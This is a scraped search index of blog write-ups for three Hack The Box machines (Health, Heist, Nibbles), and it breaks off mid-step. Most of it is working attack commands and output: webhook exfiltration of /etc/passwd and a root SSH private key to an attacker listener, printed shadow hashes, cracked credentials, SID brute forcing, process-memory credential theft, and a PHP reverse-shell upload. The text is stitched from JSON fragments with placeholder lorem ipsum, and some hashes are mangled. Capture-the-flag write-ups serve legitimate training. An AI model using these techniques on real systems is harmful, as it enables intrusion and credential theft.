+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+\n\n\n### Step 2 We know that we controll both webhookUrl and monitoredUrl, with the SQL access we are now able to bypass all restrictions from the webpage. So how can we use that to our advantage? Lets look for the php code and see if it gives any hints.\n\n\nbash susanne@health:/var/www/html$ grep -rn monitoredUrl [... snip ...] app/Http/Controllers/HealthChecker.php:14:        $res = @file_get_contents($monitoredUrl, false);\n\n\nfile_get_contents() – This is going to display the text within file(s) by reading the contents as a string, and will not interpret PHP code for execution. Because of this we can enumerate files on the filesystem, as root, and steal id_rsa or just grab the flag root.txt straight away.\n\n\nAs a PoC, lets try to get /etc/passwd printed to my webhookUrl/PayloadURL:\n\n\n(1). Create a new webhook:\n\n\n\n\n\n(2). Verify that it exists in laravel.tasks:\n\n\nsql mysql&gt; select * from tasks; +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ 1 row in set (0.00 sec)\n\n\n(3). Update the entry and change monitoredUrl to wanted file (/etc/passwd):\n\n\n```sql mysql&gt; update tasks set monitoredUrl = “/etc/passwd”; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0\n\n\nmysql&gt; select * from tasks; +————————————–+————————–+———–+————–+————-+———————+———————+ | id | webhookUrl | onlyError | monitoredUrl | frequency | created_at | updated_at | +————————————–+————————–+———–+————–+————-+———————+———————+ | 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ | 0 | /etc/passwd | /1 * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 | +————————————–+————————–+———–+————–+————-+———————+———————+ 1 row in set (0.00 sec) ```\n\n\n(4). Wait for the webhook callback and reap the rewards.\n\n\nbash ➜  health python3 webserv.py 8888 [... snip ...] Body: {\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"\\/etc\\/passwd\",\"health\":\"up\",\"body\":\"root:x:0:0:root:\\/root:\\/bin\\/bash\\ndaemon:x:1:1:daemon:\\/usr\\/sbin:\\/usr\\/sbin\\/nologin\\nbin:x:2:2:bin:\\/bin:\\/usr\\/sbin\\/nologin\\nsys:x:3:3:sys:\\/dev:\\/usr\\/sbin\\/nologin\\nsync:x:4:65534:sync:\\/bin:\\/bin\\/sync\\ngames:x:5:60:games:\\/usr\\/games:\\/usr\\/sbin\\/nologin\\nman:x:6:12:man:\\/var\\/cache\\/man:\\/usr\\/sbin\\/nologin\\nlp:x:7:7:lp:\\/var\\/spool\\/lpd:\\/usr\\/sbin\\/nologin\\nmail:x:8:8:mail:\\/var\\/mail:\\/usr\\/sbin\\/nologin\\nnews:x:9:9:news:\\/var\\/spool\\/news:\\/usr\\/sbin\\/nologin\\nuucp:x:10:10:uucp:\\/var\\/spool\\/uucp:\\/usr\\/sbin\\/nologin\\nproxy:x:13:13:proxy:\\/bin:\\/usr\\/sbin\\/nologin\\nwww-data:x:33:33:www-data:\\/var\\/www:\\/usr\\/sbin\\/nologin\\nbackup:x:34:34:backup:\\/var\\/backups:\\/usr\\/sbin\\/nologin\\nlist:x:38:38:Mailing List Manager:\\/var\\/list:\\/usr\\/sbin\\/nologin\\nirc:x:39:39:ircd:\\/var\\/run\\/ircd:\\/usr\\/sbin\\/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\\/var\\/lib\\/gnats:\\/usr\\/sbin\\/nologin\\nnobody:x:65534:65534:nobody:\\/nonexistent:\\/usr\\/sbin\\/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:\\/run\\/systemd\\/netif:\\/usr\\/sbin\\/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:\\/run\\/systemd\\/resolve:\\/usr\\/sbin\\/nologin\\nsyslog:x:102:106::\\/home\\/syslog:\\/usr\\/sbin\\/nologin\\nmessagebus:x:103:107::\\/nonexistent:\\/usr\\/sbin\\/nologin\\n_apt:x:104:65534::\\/nonexistent:\\/usr\\/sbin\\/nologin\\nlxd:x:105:65534::\\/var\\/lib\\/lxd\\/:\\/bin\\/false\\nuuidd:x:106:110::\\/run\\/uuidd:\\/usr\\/sbin\\/nologin\\ndnsmasq:x:107:65534:dnsmasq,,,:\\/var\\/lib\\/misc:\\/usr\\/sbin\\/nologin\\nlandscape:x:108:112::\\/var\\/lib\\/landscape:\\/usr\\/sbin\\/nologin\\npollinate:x:109:1::\\/var\\/cache\\/pollinate:\\/bin\\/false\\nsshd:x:110:65534::\\/run\\/sshd:\\/usr\\/sbin\\/nologin\\nsusanne:x:1000:1000:susanne:\\/home\\/susanne:\\/bin\\/bash\\ngogs:x:1001:1001::\\/home\\/gogs:\\/bin\\/bash\\nmysql:x:111:114:MySQL Server,,,:\\/nonexistent:\\/bin\\/false\\n\"}\n\n\n### Step 3 The PoC was successful, change file and for persistance purposes grab id_rsa.\n\n\nbash Body: {\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"\\/root\\/.ssh\\/id_rsa\",\"health\":\"up\",\"body\":\"-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\\/jG5NPqc2TfW4Nlj9gE\\nKScDJTrF0vXYnIy4yUwM4\\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\\/\\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\\/v\\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\\nhnqFXpOWB771WnW9yH7\\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\\/LUyan++D+8\\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\\n1bLlZQECgYEA9iT13rdKQ\\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\\/p\\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\\nzkbVWX3JRDh4vdFOBGB\\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\\nN1ZI4E59+O3Z15VgZ\\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\\/xkIP\\/Mog1a\\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\\/cQbPm\\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\\n-----END RSA PRIVATE KEY-----\\n\"}\n\n\nFormat the output to file, and grab root.txt. ```bash ➜ health cat unformated-id_rsa —–BEGIN RSA PRIVATE KEY—–+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh86KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua93bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+83yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB21bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn37LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G—–END RSA PRIVATE KEY—–\n\n\n➜ health awk ‘{gsub(/\\n/,“”)}1’ unformated-id_rsa &gt;&gt; still-bad-format ➜ health awk ‘{gsub(/\\/,““)}1’ still-bad-format &gt; root-id_rsa ➜ health cat root-id_rsa —–BEGIN RSA PRIVATE KEY—– MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/ KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH 7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8 W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9 t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8 efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2 1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3 sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q 0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o ++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU 6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G —–END RSA PRIVATE KEY—–\n\n\n➜ health chmod 400 root-id_rsa ➜ health ssh root@health.htb -i root-id_rsa\n\n\nroot@health:~# id && cat root.txt uid=0(root) gid=0(root) groups=0(root) b83ed10d472998b7cebf294c7a62719e\n\n\nroot@health:~# cat /etc/shadow root:\\(6\\)CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn/:19130:0:99999:7::: susanne:$6\\(1e4aezQ4\\)SdT0K.JpwHFrulyYF6iHx.KItM.AjoMmpyUrk.JSb/hit4YHeAJvrjKVZDEx8M9Hts5UE1FgJY.SC1ia3AvBt.:19129:0:99999:7::: gogs:\\(6\\)PwVrNTkQ$L5f1d4EbQ8d3BtOBhR8fijKDs6Px3x1bFbLHgIauWbdY0IWfYNLacYF0rVWlr6PmnyVza3JsBZunFlE6MF.uB0:19129:0:99999:7::: ```\n\n\n\n\n\n\n\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials\nhttps://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment"
  },
  {
    "objectID": "posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html#references",
    "href": "posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html#references",
    "title": "Health - Hack The Box",
    "section": "",
    "text": "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials\nhttps://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment"
  },
  {
    "objectID": "posts/2019-09-26-htb-writeup-heist/2019-09-26-htb-writeup-heist.html",
    "href": "posts/2019-09-26-htb-writeup-heist/2019-09-26-htb-writeup-heist.html",
    "title": "Heist - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\nNOTE: Working credentials found during enumeration rout3r / $uperP@ssword admin / Q4)sJu8qzA3?d hazard / stealth1agent Chase / Q4)sJu8qzA3?d Administrator / 4dD!5}x/re8]FBuZ\n\nnmap -Pn -p- -O 10.10.10.149 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman 49669/tcp open unknown Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nEnum port 80, login as Guest User and you’ll see user Hazard post an attached file containing 2 usernames and 3 password. enable secret 5 \\(1\\)pdQG$o8nrSzsGXeaduXrjlvKc91 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408\nCrack all (3) the hashes. Password 7 types can easily be cracked using: http://www.ifm.net.nz/cookbooks/passwordcracker.html Which gives us following two creds rout3r / $uperP@ssword (0242114B0E143F015F5D1E161713) admin / Q4)sJu8qz*A3?d (02375012182C1A1D751618034F36415408)\nPassword 5 is a md5crypt and can be cracked using hashcat and rockyou.txt. To find the correct Hash Mode (-m 500) see https://hashcat.net/wiki/doku.php?id=example_hashes root@p3:/opt/htb/machines/heist# echo “\\(1\\)pdQG$o8nrSzsGXeaduXrjlvKc91” &gt; cisco-hash.txt root@p3:/opt/htb/machines/heist# hashcat -a 0 -m 500 cisco-hash.txt /usr/share/wordlists/rockyou.txt -o cisco-cracked.txt –force root@p3:/opt/htb/machines/heist# cat cisco-cracked.txt \\(1\\)pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent\nPossible Usernames: root@p3:/opt/htb/machines/heist# cat heist-users.txt admin rout3r hazard\nPossible Passwords: root@p3:/opt/htb/machines/heist# cat heist-pws.txt $uperP@ssword Q4)sJu8qz*A3?d stealth1agent\nEnumerate / Brute Windows SID through MSRPC with lookupsid.py from Impacket, using found credentials. root@p3:/opt/impacket/examples# ./lookupsid.py hazard:stealth1agent@10.10.10.149 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\n[*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK(SidTypeUser) 501: SUPPORTDESK(SidTypeUser) 503: SUPPORTDESK(SidTypeUser) 504: SUPPORTDESK(SidTypeUser) 513: SUPPORTDESK(SidTypeGroup) 1008: SUPPORTDESK(SidTypeUser) 1009: SUPPORTDESK(SidTypeUser) 1012: SUPPORTDESK(SidTypeUser) 1013: SUPPORTDESK(SidTypeUser)\nExtend user-list with all new users, and run user/pass through msf auxiliary(scanner/winrm/winrm_login) root@p3:/opt/htb/machines/heist# cat heist-users.txt admin rout3r hazard Administrator Guest DefaultAccount WDAGUtilityAccount support Chase Jason\nmsf5 auxiliary(scanner/winrm/winrm_login) &gt; run [+] 10.10.10.149:5985 - Login Successful: WORKSTATION:Q4)sJu8qz*A3?d\nDownload Winrm Shell or Evil-Winrm and login with user Chase https://github.com/Hackplayers/evil-winrm (More manageable user interface; easy upload and download of files) https://alionder.net/winrm-shell/ (Lightweight shell script, would not use for root)\nroot@p3:/opt/shells# ruby winrm_shell.rb PS &gt; whoami supportdesk PS &gt; pwd\n\n\n\nPath\n\n\n\n\nC:\n\n\n\nPS &gt; cd ../Desktop PS &gt; type user.txt a12*****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate and find an odd running process. root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p ’Q4)sJu8qzA3?d’ -s ‘/opt/PowerSploit/Exfiltration/’ Evil-WinRM* PS C:&gt; Get-Process | where {$_.ProcessName -notlike “svchost*“} | ft ProcessName, Id\n\n\n\nProcessName\nId\n\n\n\n\n..\n\n\n\nexplorer 56\n20\n\n\nfirefox 7\n04\n\n\nfirefox 12\n96\n\n\nfirefox 30\n56\n\n\nfirefox 35\n04\n\n\nfirefox 38\n32\n\n\nfontdrvhost 8\n00\n\n\n..\n\n\n\n\nFirefox is an odd service to be running on a HTB box, dump the process memory and see if we can grab anything useful.\nProcess dump via ProcDump.exe: (https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) New-Item -Path “C:” -Type directory -Force cmd.exe /c “C:.exe” -ma 704 -accepteula “C:”\nProcess dump via PowerSploit tool Out-Minidump: (https://github.com/PowerShellMafia/PowerSploit)\nEvil-WinRM PS C:&gt; upload ../PowerSploit/Exfiltration/Out-Minidump.ps1 C: Evil-WinRM PS C:&gt; Import-Module C:-Minidump.ps1 Evil-WinRM PS C:&gt; Get-Process firefox | Out-Minidump Directory: C:\n\n\n\nMode\nLastWriteTime\nLength\nName\n\n\n\n\n-a—- 10/2/2\n019 1:29 PM 524\n489927\nfirefox_704.dmp\n\n\n-a—- 10/2/2\n019 1:29 PM 273\n600541\nfirefox_1296.dmp\n\n\n-a—- 10/2/2\n019 1:29 PM 302\n068992\nfirefox_3056.dmp\n\n\n-a—- 10/2/2\n019 1:29 PM 286\n191273\nfirefox_3504.dmp\n\n\n-a—- 10/2/2\n019 1:29 PM 385\n076763\nfirefox_3832.dmp\n\n\n\nSearch the .dmp-file for credentials. Remotely on victim machine: Evil-WinRM PS C:&gt; Select-String -Path firefox_1296.dmp -Pattern login_password localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login\nLocally on attacking machine: Evil-WinRM PS C:&gt; download firefox_1296.dmp Info: Downloading firefox_1296.dmp to firefox_1296.dmp Info: Download successful! root@p3:/opt/evil-winrm# strings firefox_1296.dmp | grep login_password MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=\nEnter the newfound password in your password list and enumerate wimrm using mfs module auxiliary/scanner/winrm/winrm_login msf5 auxiliary(scanner/winrm/winrm_login) &gt; run [+] 10.10.10.149:5985 - Login Successful: WORKSTATION:4dD!5}x/re8]FBuZ [+] 10.10.10.149:5985 - Login Successful: WORKSTATION:Q4)sJu8qz*A3?d\nLogin with new Administrator creds and get root.txt root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p ‘4dD!5}x/re8]FBuZ’\nInfo: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint\nEvil-WinRM PS C:&gt; whoami supportdesk Evil-WinRM PS C:&gt; type ../Desktop/root.txt 50d****************************"
  },
  {
    "objectID": "posts/2021-02-22-htb-writeup-nibbles/2021-02-22-htb-writeup-nibbles.html",
    "href": "posts/2021-02-22-htb-writeup-nibbles/2021-02-22-htb-writeup-nibbles.html",
    "title": "Nibbles - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/nibbles]# nmap -Pn -n -sCV 10.10.10.75 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn’t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\n\n\nNIKTO: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS\nVisiting the webpage we find ‘/nibbleblog/ directory. Nothing interesting here!’ embedded as a comment in the code.\nDIRB: —- Scanning URL: http://10.10.10.75/nibbleblog/ —- ==&gt; DIRECTORY: http://10.10.10.75/nibbleblog/admin/\n\nhttp://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401) ==&gt; DIRECTORY: http://10.10.10.75/nibbleblog/content/\nhttp://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:2987) ==&gt; DIRECTORY: http://10.10.10.75/nibbleblog/languages/ ==&gt; DIRECTORY: http://10.10.10.75/nibbleblog/plugins/\nhttp://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628) ==&gt; DIRECTORY: http://10.10.10.75/nibbleblog/themes/\nOn /nibbleblog/content/private/users.xml we find that the user ADMIN exists, however no password.\nUploaded files are stored at: http://10.10.10.75/nibbleblog/content/public/upload/\nTrying SQLi on /nibbleblog/admin.php blacklists us : ‘Nibbleblog security error - Blacklist protection’\nGenerated a wordlist with cewl and tried is as passwords for user ADMIN, but no success\n\nRandomly trying admin:nibbles gave access however!\nBrowse to ‘http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image’, press “Configure” on the ‘My image’-plugin. Browse for a webshell, or php-reverse and upload it.\nGo to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/ and press ‘image.php’, this will return your rev-shell.\n[root:/git/htb/nibbles]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.75] 45484 Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 10:58:49 up 45 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) /bin/sh: 0: can’t access tty; job control turned off $ whoami nibbler\nnibbler@Nibbles:/home/nibbler$ cat user.txt 405046e8f3fde67cc37f19a94e643a3c\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs always, start by running ‘sudo -l’ to see if we have an easy path to root.\nnibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\nThe specifiec file and path does not exist, however we do find ‘personal.zip’ in our home. nibbler@Nibbles:/home/nibbler$ ls -al drwxr-xr-x 3 nibbler nibbler 4096 Dec 29 2017 . drwxr-xr-x 3 root root 4096 Dec 10 